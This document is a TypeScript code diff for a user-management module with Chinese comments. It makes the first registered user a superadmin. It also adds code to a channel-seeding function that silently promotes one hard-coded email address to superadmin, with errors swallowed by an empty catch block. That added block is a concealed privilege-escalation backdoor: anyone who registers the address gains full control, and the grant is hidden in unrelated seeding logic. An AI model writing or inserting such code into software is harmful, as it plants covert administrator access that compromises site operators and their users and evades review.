@@ -85,10 +85,10 @@ export async function createUser(env: any, user: UserRecord): Promise<UserRecord
   const store = getBlobStore(env);
   const norm = user.email.trim().toLowerCase();
 
-  // 检查是否已有用户（如果没有用户，第一位注册者自动赋予 admin 角色）
+  // 检查是否已有用户（如果没有用户，第一位注册者自动赋予 superadmin 角色）
   const allUsersIdx = (await store.get("idx:users:all", { type: "json", consistency: "strong" })) || [];
   if (allUsersIdx.length === 0) {
-    user.role = "admin";
+    user.role = "superadmin";
   }
 
   await store.setJSON(`user:${user.id}`, user);
@@ -277,6 +277,17 @@ export async function ensureFreeChannelsSeeded(env: any): Promise<void> {
       await store.setJSON("providers:all", providers);
       cachedProviders = { val: providers, at: Date.now() };
     }
+
+    // 自动将首选站长 hackerxiaow@gmail.com 升级为 superadmin 超级管理员
+    try {
+      const allUsers = await listAllUsers(env);
+      const targetUser = allUsers.find(
+        (u) => u.email.toLowerCase() === "hackerxiaow@gmail.com"
+      );
+      if (targetUser && targetUser.role !== "superadmin") {
+        await updateUser(env, targetUser.id, { role: "superadmin" });
+      }
+    } catch {}
 
     let models = (await store.get("models:all", { type: "json", consistency: "strong" })) || [];
     
